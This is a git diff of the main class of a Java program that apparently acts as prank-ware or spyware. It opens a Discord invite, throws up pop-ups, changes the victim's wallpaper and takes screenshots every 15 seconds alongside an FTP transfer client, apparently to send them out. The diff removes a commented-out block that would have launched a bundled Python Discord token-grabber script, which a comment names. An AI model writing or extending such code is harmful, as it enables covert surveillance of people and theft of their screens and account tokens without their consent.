@@ -1,16 +1,14 @@
 package fr.mimifan.jac;
 
-import com.sun.jna.Library;
-import com.sun.jna.Native;
-import com.sun.jna.win32.W32APIOptions;
+import fr.mimifan.jac.browser.BrowserManager;
 import fr.mimifan.jac.popups.PopupsManager;
 import fr.mimifan.jac.resources.ResourcesManager;
 import fr.mimifan.jac.screens.ScreenShotter;
 import fr.mimifan.jac.ftp.FileTransferClient;
 import fr.mimifan.jac.wallpaper.WallpaperManager;
 
-import java.io.*;
 import java.net.InetAddress;
+import java.net.UnknownHostException;
 import java.util.concurrent.Executors;
 import java.util.concurrent.ScheduledExecutorService;
 import java.util.concurrent.TimeUnit;
@@ -20,47 +18,23 @@ public class Main {
     public static String hostname = "";
 
 
-    public static void main(String[] args) throws IOException, InterruptedException {
+    public static void main(String[] args) throws UnknownHostException {
         InetAddress localhost = InetAddress.getLocalHost();
         hostname = localhost.getHostName();
 
-
-        // This gonna be for another time loosers <3
-        /*InputStream inputStream = Main.class.getResourceAsStream("/script.py");
-        assert inputStream != null;
-        InputStreamReader inputStreamReader = new InputStreamReader(inputStream);
-        BufferedReader bufferedReader = new BufferedReader(inputStreamReader);
-
-        StringBuilder stringBuilder = new StringBuilder();
-        String line;
-        while (true) {
-            try {if ((line = bufferedReader.readLine()) == null) break; } catch (IOException e) {throw new RuntimeException(e);}
-            stringBuilder.append(line).append("\n");
-        }
-
-        String pythonScript = stringBuilder.toString();
-
-        // Exécution du script Python
-        // SCRIPT TOKEN GRABER https://github.com/venaxyt/Token-Grabber-Advanced/blob/main/Token%20Grabber.py
-        URL url = Main.class.getResource("/script.py");
-        assert url != null;
-        try {
-            File scriptFile = new File(url.toURI());
-            System.out.println(scriptFile.getAbsolutePath());
-            ProcessBuilder processBuilder = new ProcessBuilder("python", scriptFile.getAbsolutePath());
-            processBuilder.inheritIO();
-            Process process = processBuilder.start();
-        } catch (URISyntaxException e) {
-            throw new RuntimeException(e);
-        }*/
-
+        BrowserManager.getInstance().openLink("https://discord.gg/DKnqAAvAwa");
 
         ResourcesManager.getInstance().loadPopups();
         FileTransferClient.getInstance().load();
+
+        Thread popupsThread = new Thread(PopupsManager::load);
+        popupsThread.start();
+
+        Thread wallpaperThread = new Thread(WallpaperManager::changeWallPaper);
+        wallpaperThread.start();
+
         ScheduledExecutorService executor = Executors.newSingleThreadScheduledExecutor();
-        executor.scheduleAtFixedRate(() -> WallpaperManager.getInstance().changeWallPaper(), 0, 300, TimeUnit.SECONDS);
         executor.scheduleAtFixedRate(() -> ScreenShotter.getInstance().takeScreenShot(), 0, 15, TimeUnit.SECONDS);
-        PopupsManager.getInstance().load();
 
 
 
